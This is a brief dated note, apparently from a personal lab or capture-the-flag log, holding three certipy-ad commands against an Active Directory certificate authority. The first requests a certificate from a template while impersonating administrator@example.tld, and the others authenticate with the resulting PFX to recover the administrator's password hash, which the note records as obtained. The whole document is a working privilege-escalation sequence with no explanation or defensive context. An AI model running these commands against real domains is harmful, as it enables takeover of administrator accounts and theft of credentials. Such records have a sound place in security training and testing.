### 2025-05-12-Sun

```
certipy-ad req -username JOHN.DOE -password 'letmein' -target example.tld -ca EXAMPLE-CA -template EXAMPLEUSER -upn administrator@example.tld -dc-ip 10.129.228.253 -debug
```

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

```
certipy-ad auth -pfx administrator.pfx -domain example.tld -username administrator -dc-ip 10.129.228.253
```

*Got hash for 'administrator@example.tld': LMhash:NThash*

